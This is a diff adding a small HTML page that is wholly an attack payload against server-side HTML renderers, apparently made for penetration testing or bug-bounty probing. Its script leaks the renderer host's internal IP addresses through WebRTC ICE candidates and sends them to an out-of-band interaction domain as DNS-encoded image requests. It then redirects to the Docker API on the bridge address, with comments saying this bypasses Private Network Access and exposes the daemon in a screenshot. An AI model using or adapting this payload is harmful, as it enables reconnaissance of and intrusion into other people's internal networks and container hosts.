@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head><title>t</title></head>
+<body>
+<script>
+var OOB = 'd9qr0pj6b8m6l63p75m0oxmqxfmg56ofc.oast.pro';
+function dns(label) {
+  var l = label.toLowerCase().replace(/[^a-z0-9-]/g,'-').replace(/-+/g,'-').replace(/^-|-$/g,'').substring(0,60);
+  new Image().src = 'https://' + l + '.' + OOB + '/';
+}
+
+dns('v14-start');
+
+// WebRTC ICE: leaks actual internal IP of renderer host
+try {
+  var pc = new RTCPeerConnection({iceServers: []});
+  pc.createDataChannel('x');
+  pc.onicecandidate = function(e) {
+    if (e.candidate && e.candidate.candidate) {
+      var m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/g);
+      if (m) m.forEach(function(ip) { dns('ice-' + ip.replace(/\./g,'-')); });
+    }
+  };
+  pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
+} catch(e) { dns('ice-exc-' + (e.name||'').substring(0,6)); }
+
+// After 1s redirect to Docker API on bridge — top-level navigation bypasses PNA
+// If Docker daemon at 172.17.0.1:2375 is open, returns JSON {"Version":"..."} → screenshot shows it
+setTimeout(function() {
+  dns('v14-redir-docker');
+  window.location.href = 'http://172.17.0.1:2375/v1.41/version';
+}, 1000);
+</script>
+</body>
+</html>
